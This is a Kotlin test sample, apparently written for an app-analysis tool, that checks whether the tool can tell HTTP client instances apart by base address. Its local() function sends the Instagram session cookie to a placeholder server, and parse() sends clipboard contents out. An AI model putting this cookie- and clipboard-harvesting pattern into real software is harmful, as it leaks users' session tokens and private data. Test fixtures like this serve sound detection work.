// TEST SAMPLE ONLY — never runs (manifest hasCode="false"). Fake endpoints marked SIMULATION.
// One HTTP client class, two instances with different base addresses: PackPeek must tell them apart.
package sim.app.twoclients

import android.content.ClipboardManager
import android.content.Context
import android.webkit.CookieManager
import java.net.HttpURLConnection
import java.net.URL

/** A client like the ones apps build around OkHttp: the base address is a field of the instance. */
class Client(private val base: String) {
    fun send(path: String, data: String?) {
        val c = URL(base + path).openConnection() as HttpURLConnection
        c.setRequestProperty("X-Data", data)
        c.responseCode
    }
}

/** Instances kept in fields, as dependency injection or singletons do. */
object Clients {
    val instagram = Client("https://i.instagram.com/api/v1/")
    val own = Client("https://collect.sim-server.example/v2/")
}

class Main(private val context: Context) {
    private fun cookie(): String? = CookieManager.getInstance().getCookie("https://www.instagram.com")

    private fun clip(): String? =
        (context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager).primaryClip?.getItemAt(0)?.text?.toString()

    /** The cookie goes only to Instagram. */
    fun profile() = Clients.instagram.send("users/web_profile_info/", cookie())

    /** The copied link goes only to the app's own server. */
    fun parse() = Clients.own.send("parse", clip())

    /** A local instance, created and used here. */
    fun local() {
        val c = Client("https://local.sim-server.example/")
        c.send("x", cookie())
    }
}
